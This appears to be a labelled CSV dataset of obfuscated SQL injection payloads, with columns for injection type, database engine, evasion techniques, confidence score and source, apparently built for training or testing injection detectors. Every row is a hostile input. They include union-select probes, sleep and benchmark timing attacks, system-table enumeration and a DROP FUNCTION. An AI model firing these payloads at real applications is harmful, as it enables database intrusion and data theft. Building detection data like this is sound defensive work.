payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1%' ) \) ) anD- (sEleCt 0o6x28CA)%likE Utl_iNADDr.Get_host_aDDrEsS ( CHr ( (SeLect (SELeCT (SELEct (SelECT (SeLeCT 0X73)))))~ ) [ OR cHR )( (sELeCt 1X0x0b1001401)= )/*<9DD/Ktb!0BL9S2|0X5|^@{TOfYo5qKKucW7*/ ||chr ( (seLEcT (selEct""(sELeCT (sELecT (sEleCt$(sElEcT 0X10)))))) ) ||CHR ( 0x5O154 /) or ChR (~ (selEcT (SelecT (sELEct (sELEcT (sELECT (SeLecT (SeLECT (seLeCt (SELECt 0X71))))))))) ) `|| ( seLECT [ ( caSE)WhEN ( 0x7o2142 LIkE (SeLECt 3b0X1121)> )< tHeN (SeLecT (sELeCt 0x6X1)) eLsE 0X0 OR FalSe or FAlse && 0x1dA5=0X1Da0o5 or FalSe or FalSE && tRUE and truE:Or faLsE>aNd (selECT (seLEct (seLeCt/**/(SELECT (SELECT (SELECT (SELECT 8656))))))) != 0X21D1 anD tRuE oR FALse oR 0x0 OR False#eND ) fROm Dual )) ||CHr (@ 7x0X0x4c. ) or cHr^\( 0o0X0O5a .) ||ChR ( !(seLEcT (sElEct+0xBc)) ) ||cHR ( +0B6x0X0O6A ) || chR< ( 0X6E ) ) (>&& . \( (+ ( '%' LIKE 'bhOZLkZSnW0KU)%YE%o &UX\TUB",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.51,rule,sqliv5_json,unknown
"1"" )} !Where}0x0O0b0B0b111100110110001110110001000101001101000010011010100100111001001011111010110110110000101011100000101001010111100010101110010 oR (sEleCT 0) Or 'r'!='R' AND/*Y*/6047 nOT=6048 ANd,: 1 aNd TrUe/**/aNd trUE#= 0o0XAaE WAItFoR#DELay:'0:(SElEcT.0):0b0x0b0o4146467'--9gC",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,string_single_quote
"1%""?$?)* &) <oR^ Exp (, ~ ( SelECT * fRom %( SeLect CoNcaT? ( 0b0X0x5B11042010110111001111010A0O107, \( &SeleCt [ ( elT ;(, (selEcT 0b1100051111180)/**/ LIke (SElEcT 5x0xbBE),0x1 ) ) ) ,0B0x0B1011091101A0B1011110111A71,0X59 ) /*V]_eI{& T&LnwFxRMJ0K:^%K*/ ) x ) ;) && ( ( ""%"" LIkE """,unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"seLEct'cOUNt? (-&*~~).[:fRoM>sySIbM.SySTAbLeS{aS*T0x0o5b3o0,SysIbm.SYstaBleS>aS/*(]gE B:Uhx{F&rZ1Z/FEZDa_o (SELECT`0x5)*AmDCs6\Z)D\nmfrzV2*/t9O0x0X8O10b0x0b8O0x0X6E,sYSibm.SYSTABlEs!as{T7X0X0(aNd<'%' ()?LiKE@] ~'",unknown,unknown,case_variation|inline_comment,0.0,rule,sqliv5_json,unknown
7 /*lwVsa*/ ) /**/}) /**/ As-gygM:wheRe<0B0b0B0B111XfB8=0b111110111000,unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
0B4'+ ( SEleCt?ijOh WherE(6X1bE9/**/@LikE/?7X0B0O1be0b1001.ORdEr[bY>0b2B8o8o1--,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"if/*i< */ ($,0b10000111011 /**/=^.(SELECT (SELECT_5809)) @) SelEcT 0b10000111111""ElSe DRoP FUncTioN zzEH--",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"2o0B115'< ) ^ ) ~[ oR ?0x0X9X0O1dab;*=\ +`(<:SelECt coUnt .( * ) ; froM dOmaIN.dOmaiNS aS T0o3,DOMain.CoLuMns as T7b0O3b0B80,DOMAin.tAbLes^AS*t5O0O2@ )) and /* `{[]?GLVqFn<XFJ0""<}(SelEcT (seLECT 0)))eyF5uu*/( ["" (>`)'HFQz'='HFQz",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"seLEcT_cOUnt[`(?**}.)&;+from sySIBm.sYstablEs as~t0b0x4o0o0X47b0o0b0b11X0O7,SySiBM.sYStabLEs@As/*W)wl~l`Hq2~anK3 ]!RX;Q.iO0o10A*/T0x2,sYsIbm.syStABLes`as t0O0b11B0o0x4B0X0b0b0B2x0B3551<aNd@-%(+,""%""+=/*L(b:`lV*/""",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"4B0b1* ) +*as}jqBp!WhEre (SELEct<(SElEct (selecT 0X1D0D)))[lIKE 0O0x0X0O0O229F*,And/ (sELEct 0X11aD) <= (sELEcT 0O0x0b0X11f6)~AND@0x2687< nOt /*sG`*/LikE]/*OW6{*/ 0X0x82c OR FalsE* OR FaLse+ oR ` faLSe#weT|idw^1n",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0b0x4o0x0o8o1o5B0B0x0X0o5%'+?)} unION%AlL+SEleCt{NuLL,NulL,NUlL,null,nUlL,nULl,Null,nUll,nuLl or;FALSe+oR>faLSe Or!falSE{oR/**0X0X6f$j%s*/FALse oR<FaLsEAnDTRue:or_FALSE#7iv9(C5O8JO",union_based,unknown,case_variation|inline_comment,0.8,rule,sqliv5_json,unknown
"4X0B15X0O3B0b0X0b111x0b0o9b9O0X0b11B110x0o0x0o0O0B0o0XbE' /*PgXKq>;(SELEcT~(SeleCt 0b0X8o3))FaM;c|R*(SeLecT;0x0X6) (SeLeCT~(SELECT 28))Lksw*/()?,;/*.(sElECT*(sELECt}0x0X0O0x5))Y0^NH 0O10e\p.kf}s*;;;Bs*/)(:)| ))$$unIoN_aLl SeLEcT\nULL,nULL,NULl,NULl,NulL,NUlL,NUll,NUll,null,NuLl--",unknown,unknown,case_variation|inline_comment,0.0,rule,sqliv5_json,unknown
"1o0O0o0"" )~`-wHeRE 2b160011101801{=!(SeLEct 0o0O0b111110111100)%oR sleEP/*T ;Vmaw*/ (\ (SeLeCT (SeLEct+(SelecT!0x8x2b5001))) );* AnD < trUe ANd^0B0X0X0o0x271A LIkE@1X0O4106 AND TRuE oR False\--",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"9' Or { ( sEleCt 'gWXC' fRoM duaL whERe (seleCT (SELECT 3686)) =! (seLecT (SeLECt 3625)) aND chaR ( ?(select 0x6b){ ) ||chaR ( 0O171 ) Or chaR :( 0x63? )\ ||cHAr/*N-MG*/ ( (SelecT (SelEcT (sELEct 80))) ) | lIKe rEGEXP_sUbsTRInG (| RePEAT (^ LEft ( Or falsE oR False AnD tRue OR FaLSe OR 0#cRYpt_KeY '( chAR ( #(sElEcT (sELECt 0X2E)) ) Or char ~( (seLeCT 69) ) Or chAr ( (select (SeLEct (SELECT 83))) ) ,nULl ), ,0o0 ) ,0x1dCd0b1001510110A ) ,nULl &) Or 'o' Not lIKe?'O'}OR '0O0wD' lIKE '0X3WD!' ANd 0X1 aND TruE AND (sELEcT 1) OR fAlsE < ANd ';0X6-g' Not LIKe ';(SeLeCt (SELECT 6))-g7X9' oR (SelECT (SEleCt 0)) Or falsE OR (selecT~(SELEct 0)) OR (sELect (SELECT 4071)) != 2071 OR ""LA*"" NOT LIKE ""LA*"" oR 0X0 oR FALSE --KB?",boolean_blind,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,numeric
"1' /*9Su+af8*/ )! )[, AS<GRne wherE*0o0x0o0O21013 &=. (SeLECT (SelECt""(SELeCT 0O0x138B)))=Order By]4X0o4--",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0b0o0o4B1"" and CHar ( 0x0o116 ) or cHAr/*]<ho*/ (~ 0x66 `) OR chAr (<`0X75 ) } oR chaR (> (seLEcT (SElecT 0X5))! ) ; lIKe ReGexp_suBStRING () rEPEAT$ ( RiGHT ( cHar* ( 0O24375 ) ,(SELeCt (SELECt (SeLeCt (SeLEct (SELEcT (seLEct (SELECT 0))))))) ) ,0o43355753002 ) ~,NULl ) && ""wrBS"" lIKe ""wRbs",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"0X0B1"" ) ) ~ as HKrh WHERe!(sELECt.(sELECT 0x0xBf5))/**/='0o5460/*<bmxgPJ*/Or]cHaR ( (seLect (SeLecT (SeLEcT (sELEcT (SElect (SEleCt 0x77)))))) )/ Or ChaR} ( 0o152 ) .oR chAR$ ( (SELEct (sElecT 0b6X63)) ), OR cHAR ( 0x79 ;) \ likE~rEGEXP_SubSTrinG !('(RePeat ( RIGHt _( chAr [( 0B0o0b1101001011110000011000001011111011101 ) Or FAlSe#,(SElecT_0)|/*5jeb*/) .,(sElecT 0o5b0o0x0B0b100110111010000101101011100010010010012111000110110111310100010001011010101011000010100100001001101010000101101000110) )@/,Null(^) $Or 0X15E9 Like 0B0X15eA && 0x1{OR '$O0B0x8c'!='$o0b1000C'=--n",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1""',) As`KnDn Where~0o0O0b10001100116001110 lIke/*w*&*/ 9318",unknown,unknown,inline_comment,0.0,rule,sqliv5_json,unknown
0O1 )+ & ) aS TNhY WhEre 0X452 liKE (SeLECT (seLeCt[(sElEct 0b0x2544ab284))) aNd%(select (sELeCT 0x2628)) lIkE (SeLEcT 0O16224) OR FALSE Or 'N' nOT/**/LIke''N' oR (SELeCt (seLect 0x138B)) LIKe <(SElect 0X738c) OR falSe AND tRue#Zf<.1e6,unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"selECT&sLEEP/*(sElect 0X9)}YWNhw Q*/ ( 3x2o2Xa> )+ ; && ~ <{(/*j(NnV:KJNtcp9*/ ""%""+LIKe """,unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"1 WhEre 0B110111013010 }like 6XD8E'Or*(SELEcT (sELEcT (selECt 0X65F))) = , (:=SelEct couNt ( * :) from RdB$FiELDS'AS t1,Rdb$tYpEs AS t0,rdB$coLLAtIONS As t2,rDb$fUncTioNs AS+T0O4]/*)CO_4&*/) OR 0X1d0b0O157c not lIKE ](selECt.(sEleCT 0x9O1D2C))&&TRue or FAlSE or FALSE ANd (sELEct (SELECT (SELECT 1))) --",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"1'& ) `/*+`]iG}*/ ) && 0O0x9X5Ba LiKe BEnchmARK,*(+ 0X4c4B0x4o39,mD5 ?('.2X8X0O6d0b8X4F9C5] ) ) + or> FalsE or FAlSe OR FAlSe && TrUE or faLSe AnD&(sELeCt (SELECT (SELECT 3x1)))#T8mG""0X6 D2dleO~]N",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"1/**/ )`:/*0b0O5g21O v */ANd 0b100XEf0>+=* beNcHmarK >(]`0O0X0b100c4b0o4,mD6X8 ( :0O0x0o4x0B109016100110021110041111010\ ()}+/*OZ&Z8SPE*R*/>)-( aNd\ (: (sElecT/(seLeCT (SeLecT{0X0x1a82))) |LIke?<0O15202",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"SElecT couNT/*(SelEcT (seleCT 1))/*/-( ** ) + frOm<dOmain.DOmaiNs aS T5,DOMAin.COLUmnS AS%T2,dOMAin.tabLEs aS t3 anD. 0X1b39\oR false oR+faLSE aND/*\Cv,?*/tRUe aND trUE OR fAlse Or 0X906!=(SELECT (SELECT 2310))#NOT=(SELEct (sELECt 0b101115011010))#7oX{Y",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"0B0b1100101o0B5B0B0O0X8o2o0o3B8%""=+?)J*/*J^;[*/`) {\)\, !UNIon!all@SELecT nuLl,Null,Null,NuLL,nULL,NULL,NUll,NuLL,nULl/**/OR(False-aNd%TrUe\And`(sElECT (seLEct 0B10001001011))<>0b0B0b11000101011010100001100001001110110000100110101001001000111000101011101111010011000001010111111110110011001100~ANd~""Z""`noT lIkE ""ZO"" /**/or (SELEct 0X0) oR fAlSe aNd 5177 Like 5177 Or 0#h[w;>0o1r, `i<\HVP",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,unknown
"1' ). ) <aS lMsl WHErE (SELECt 0O0o0O0b0b0b1110101100011001010100100101010010000100100001110111010100110111101011101111011110101100011011011001110100101101011001110011010000101)\ = &6b0b111011011111010100100110101011100001001|or eLT _(/**/`(SELeCt 5872) = 0X16F1,SLEEp ( 0X6 /**/ ) ` ) (.oR (SElect (sELEct (SELecT 0))) OR'FALse aND""'FO' Not{lIke 'Fow' Or""(SeLect (seLEct;(selECT 0))) or FAlsE oR (seLEcT (seLecT,512))!=(SelECT (SELECT 518)) or FaLsE And ""D"" NOT LIKE ""di"" && (SELecT 1) OR (SeleCt 0xc06)=3079 Or false Or=""!"" nOt LikE ""!""?oR<FalSe anD TrUE#=lk",unknown,mysql,case_variation|comment_whitespace|inline_comment|function_alternative,0.05,rule,sqliv5_json,unknown
"1""/ ^)/ ) ) or ElT/*4g6[O+k^B^$`Zckq*/ ( =0O0b410O0O0o0x2b0b1100111011000110001010110111011001010 lIke (seLect (SeleCT 0x0b0b1010010101101011001011125110001100)),SLeEp ( 8X0X0b100 )) $ )? && </*+/ZY*/ ( ( /*0x5O;6TAOQ5*/ ( {""HxGU""=""HXGU",unknown,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.05,rule,sqliv5_json,unknown
2O0b1' -)< ]As]tWNY WhErE/**/(selECT 4580) Like^ 0B10010701110110,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"8' ) ? )* ) ( SelecT - ( cASE wHEN ( 0b0XEb85B29AA1b0 and 'Rb' lIKe!'rB'?OR""'\' oR (sELECT 9O3x158F)!=(SeleCt 5X1587) OR faLSE;. && 0x1 && 'lve' <> 'Lve$' aNd tRuE Or faLSe /**/AnD 0x0b101x33e3 != (sELEct (SeLect (seLECt;0X0o14Da))) Or ""Hr"" NOt lIkE ""hR"" Or (SElEct (SelECt (sElecT 9X0))) AnD True oR fAlSE:OR ""kb""!=""kB"" oR fALSE aNd truE AnD trUE ANd (Select (sELect (sELeCT (SELECT (sELECt 0X1))))) Or FalSE aND trUE OR FALsE anD tRuE AnD trUe and tRue OR 0o0 aNd TRuE AnD (SElecT (SeLECT 0o1)) Or (sELEcT (SELECT (SELECT 0))) aNd ""s"" LIkE ""S"" or FaLSe OR (SELECT (SELECT 0))#not lIkE_'\' AND 'BD' NoT LikE 'BDr' OR FaLSe#= 0x650b ) & tHeN rEGExP_SuBStriNg ( repEat ( RIGHt ( ChaR ( (seleCT (SelECT/(sEleCt 7X547))) ;) ,8o0@&) .,0X1dCD6308 ) ,Null ) noT LIKE elSE CHAR[ ( 3X6c ) ) oR cHaR ( 0X4C {) ?Or>Char ( 0O156 ) OR@chAr ( 1b0B1x0o0x4f /*:A|]xVV oo~`9lEY>4hGR*/) ~ enD ) FRoM+inFormaTiOn_sCheMA.sysTEm_UsErS ) "" && ( ( (, 'BVDw' LikE 'bVdWkx:Bts& e2",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_single_quote
"1"" Or/**/UpdATEXml .( 0x1a98,cOncaT ( 0O0B3o2X2E,2x0O0x7171776A71, $( <SELecT (^ elT[_( 0B11101010110 +lIKe (SElECt (SElECT`(seLECt (selECT (sELeCt (SeleCt 1007)))))),0o1 ?) ) )) ,9X0x2caA81a78 ) ,(SELEct](sElect 2x21DA)) ) ]",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"SEleCt(sLEep ((-0B0b0x8B0o8B0b0x5o5B8o0O0X27B/*j*`(seleCT 0x4)0j */ ) ; AND) ;>( /**/ ""( * 'srfc'`lIKE('SRfc",unknown,mysql,case_variation|comment_whitespace|inline_comment,0.05,rule,sqliv5_json,unknown
"0O0""?{) wHeRe((sELeCt>8O4x0b0o0B0o10150315392) likE ;(sElect (sELeCt 0x0X0o5bA)) /*|0kIrDwd _Kc$~?;~P;*/ oR $`\ (SElECT (SeLeCt (sEleCT (selEcT 0B0o38955105345560))))=^<( seLecT?cOUNT/*MoX ]Baz(0x0B0B5O9Fd!rp{Z+ND)?qCw""*/=( _*[?) /*""|/2g)r)8c%Jz?A HysZUkW^:kQZEWFcigiu7s*/FROm/sysuSErS:As^SyS9,sySUseRs[AS]Sys0O0o0o0O2,sYsuSErS AS=sYs0O0o7,SYSUSERS\As~sys7,sysuSERs aS:sYs0o0X0B0x0O3,sysusERS`as syS4,SYsuSERs)AS SyS0B1xa \) }]Or\~falSe anD\(SeleCt)(SelEct)0x1))) && tRuE)--",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0X0O1 whERe (SeleCT 0XA0o3f) LiKe (SELECt@(seLEct!0XB07)) ANd 0O2X8xE0b1O0b10011101B \= /**/(} selECT coUNt ( * ) :fRoM SYSiBm.sySTableS aS t1,SYsIBM.SYstAbLes'As t6,SysIBm.sYsTABLeS as t3 ) && 0O0B105720001100 LiKe 0O4617 AnD (SelEcT 0xA3f) NOt likE (selEcT (sELecT 0x0O0B1100910111010)) Or 0o10x9 or 'd'='DK' oR\fALSe AnD 'I'<>'I5B0B11'; AND) ""wgAG""=""WGAg"" OR 0x188C<>(seleCt (SelecT)0X171c)) And TruE aND TrUE ANd trUe oR FALSe AND 0o0x8 ANd (selECT (seLECt OR ',/UWe'<>',/uwe' OR FalSE oR ""/>"" LIkE ""/>}"" oR FALSE Or FalSe AND True#(SELECt 0O0x1))) AnD tRuE ANd TRUe oR '$E' not='$e' oR (sELeCt (seleCt (selECt (SeLECt (SElEcT (SeleCt (SelecT (seLECT (sELecT (sELECT (SELEct (SELECT 0)))))))))))) AND ' R' noT Like '?R^' or faLsE --{dLPIp.",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_single_quote
"0o10x0O0O0x1%""(aNd eLT>$(' 0B0o10231/*e+(SeLeCT (seLECt`(SELecT 0X5)))|Vj4~Ve.OA*/ Like, (SeLEcT+0x0x0o1913),0b1110010117011 >) /'9* && ;_""%""+< lIke%+}""",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"0X6' WHere 0o0X958 LIKE 0x0o1813 && (seLecT (sELect (sELECt (SELEct 0X8cD)))) =( cAST ( ( , chr ( ^0O8O0X41 ) ||cHr ( (SELect 0x71) ) ||Chr( ( (seLeCT (sELEcT (seLEcT (SELECT 152))))+ ) ; oR chr ( (sELect (SELecT (seLECT 0xc0))) ) or cHR ( }(selECt (SElect!0X73))\ ) ; ) ~oR ( SeLECT ( CaSe WHen ;(! 0o5445 like (selECT 0xB45) ) /*^LNS-D|TA:uZdd*/ THEN 0X1 Else 1o0b0x0 eNd + ) ) ::teXt oR ( chr (& (selEcT 0x75) ) ? OR [}Chr ( 0x7A ) oR chR ( ;0x76 ) {||CHr ( 0o0x0A )\ ||ChR ( (seLECT!0X71)& ) ) As NUmerIC )/*+)}>41Fn?*/ or 5X0o0 or/(SEleCt (SeLecT (selEct (selecT (SELECT 3))))) or (selecT$(SelECt (SeLECT 0X3))) oR fALsE aNd TrUe or FALsE ANd ""0X7"" Not LIke ""0b0B0x42296945|"" AnD &TRuE Or faLse OR '7B12x' noT lIkE '0o9x' or 3x5 or FAlsE or (SElEct (sELeCt 4x0)) && 0x1 or FAlsE && TRuE anD TrUe and ""FXY`""=""fxy`""|ANd (SeLEcT (SelECT 0X1)) AnD trUe oR fAlse oR False OR fAlse Or falSe Or falSe && (SEleCt (SELECT 1)) oR 0x0 oR faLse Or FALsE --",unknown,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.06,rule,sqliv5_json,unknown
"selECT coUnt:&( ""*??)&@`From=sySIbm.syStablES&aS|T0B0B0x64,sySIBM.SysTABles*As T0b7o0B0o0b0X2,Sysibm.SYStAbLES AS/*W (SElEct*1b5x0B1041)>(selECt!0x0B0x1b1011)o C{BJ=i45<[q#e`*/t3b3O0b0X0O0O0B0x0o2q`",unknown,unknown,case_variation|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0b0x0O0o5""~uNiON[All}SeleCt[NulL,NuLL,NUlL,Null,nUll]or 0o0b1x6<aND true+AND/*a1o**/(SELECT 0xc1b) NOT LIKE<?(SELECT (SELECT 3106))#0B120x HKo[]qGeQ9hz n",union_based,unknown,case_variation|inline_comment,0.8,rule,sqliv5_json,unknown
"SElect%COunT^((* *?%) \[fRom/*(SelecT:(SelecT!(seLect`2x29))):>=xRp (sELecT!(Select$0x2))B ' vtA^m9L-AHP0b1001*/rDb$FIeLDs aS>T9,RDB$TYPES!As t0o5,rDB$cOLLATIons:as-t0b9b0o0b1105,rDb$FUNctIons/*H""vy(NXS`Yo}pxEJk*/as""T1B0b4740100--",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
SeLEcT sLEep!/*0S*/({ (SelEcT (SEleCT 0x0O5)) ) &&tRuE&--.hLGt,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"1X1' /*1NBg:/fBb*/ ) ) ) = ( SeLecT+ ( CASE whEn \( (SELeCT (SeLECt (sEleCT (SEleCT (SeleCt (SElECt (selecT (SelEcT (selecT (SELECT 4585))))))))))?/*& eX)*/liKE 0x11Eb ) THEn REGeXP_sUBSTRIng ^( REPeat, ( lefT ( crypT_Key| (/*)*k@( cHAR ( (SElEcT*0x0B101901) ) ||Char ( 0x15 ) Or cHar ( (SeLECT 1b1918082) ) ',nULL ;) ,0b0o0 )! ,0x0X0o0o0B1dCd6500 ) ,NUll ) ELSe cHar ( >(SelECt 0X4c) ): or chAR[ ( (SELect (selECT (seLEcT (SelEcT (seLEct 0B0b0x41))))) >) Or cHAr ( @(sElecT 0o5) ) OR cHaR (% (selEct (sEleCt 2X48)) ) enD ) FROm ( valuES )(* 2b9o0 _ ) ) ) And (| ( ( 'sQnK'='SQNk",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"1'/**/ ) : *) `?As ytFI whErE<5B110011111016 ;LiKe /*)M* (SelEcT (SeLEcT*8x5C))0O3mew=nN8zbT<*/0o0o2738_ && 0X4O0O5b0x9o0O38e0x2D0A8Fb9dB4` LIKE ;Like!?([ 'aBcDEfg',UPpeR, ( HEx: ( ~RaNDOMblOB ( 0O0o0X0x9Dcd0X0o0B0X0o7b11101110011010/0b0xa: <) ^ ) ~) ) :*/` && ,trUE%oR&fALSE oR (?(sElECT 0O1x0O0B0)+anD!(sELecT-0x0x1) --",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.53,rule,sqliv5_json,unknown
8' [ ) _ ) ) &&[0B0o0b0X98ae410E0fc LiKE ; ( 'QQpjq' Or' ( sEleCT CAsE 0x6458^wHen 0b110010101051 THEN (SeleCT 0o5) eLse (selEct;(seleCT (SelEcT/(Select (selEct (SELECT (SELECT 0))))))) ENd FroM-RDB$DaTABAse ) ?OR 'QZvZQ'- ) ~anD ( ( \( 'SNOA'/*Z5i{(SeLecT+57)?'Xt7)(SELECT 3)*/ like ~'SnOa,unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"4"" WhERE|0O0O0b0b30091100110110%=_(seleCt[0x1X1B0b0b11110100001001001010) aNd (SEleCt;(select (SELECT 0x1369))) lIKE ( ;Select 0B1105100131501{fRoM|PG_slEEP ( 2X5 ^) $ ) Or?(sElECT:0)/*)f0b0x0o0c T*/aND 1+--",unknown,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.06,rule,sqliv5_json,unknown
SElECT^CAse WheN}0X7X8B8]lIKE{8B9X0X4CD_thEN^0x8X9:eLSe@nUll/*){oW\(SELECT 3)$%H*/eNd--,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"0x0x1O1'. )'<.aS mQxB WHERe 2x19bf* LIke+ (SeLEcT.0X3967)/*(selEcT\0x0o0B1101)& or faLSe)OR<FALSe OR FaLse OR=FalsE# (seLecT (SELECT 0x4))&&oCe*/And 0X4X5fd ""=}_3555--t",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"0' Or (seLECT/(SelECT (SelECt 0B0B7X515)))= :(/*(selecT (SeLECt (seLECT (SelecT (SElECt (SELEct (sELECT (select 6))))))))*/ selecT cOuNT]/*[*/() * ;)( frOm rDb$fIELdS as t6,rdB$TYPes'aS t7x9B0,rdb$cOLlAtIOnS=aS t3,RdB$FUnctiOnS As!T0x2 ) $aND 'yNpR' =( 'yNpR",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"0X1' OR ~( (SelecT 'IoCs' Where 0o0o0X0xD1E7 liKE (SeLEct (sELECT (SElECt (selecT (SeLeCT (sElECT (sELeCt 9287))))))) anD +(selECT 0x00d7) lIke _/**/ ( &sELEcT coUNt ( * ) + fRoM GenERaTE_SERIeS ( (seLEct 0B1),0B0X23f3d5F03F6E91b82D5 ) ; ) ) or '",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.46,rule,sqliv5_json,string_single_quote
"4"" ) +as_jTou<wHERe (seLEcT*0x1fc1)` =/*=;<C/|_9*/ 0x2151(anD?(seLECT=(SeLect 4x1d6d))+=/0b0o1751x0O8x5X2D8x0B710d--",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
5 ) WhERE/**/0x0B11800411e; ; lIKE 3X1896,unknown,unknown,comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"sElECT COuNT (_ * ) !FrOm GEnEraTe_SErIeS /*>(SeLECt 0o1),A)*/( 4,0B0b0b101101010001110110010111100011011001011111000000110101101100011000101101011111001000001010010000110000011010110011010100000011111000111000100010110010010010101011110010000011010001001101110001010001111101001101011101001011010110001010001100010 ) 'and 'DfWj' LiKe 'DFwj",unknown,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative,0.06,rule,sqliv5_json,unknown
"5'+ ( >sELECT lUwN wHeRe 9X4Be=0x7BE Union alL~sElecT(NuLl,nUll,NuLL,NULL,nuLl,Null && (Select 8x1fdd) LIKE^(SEleCt 9X0o1FDf);oR (seLeCt (sElect (SelecT (SELECT 0)))) Or fALSE ANd"""" G"" noT/**/like "" gL"" oR ""8""=""7g"" aNd 'Pv^_t' lIke 'Pv^_T' or fAlse OR FaLsE aND tRUe#cHF7p;7p*6ywt",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.7,rule,sqliv5_json,unknown
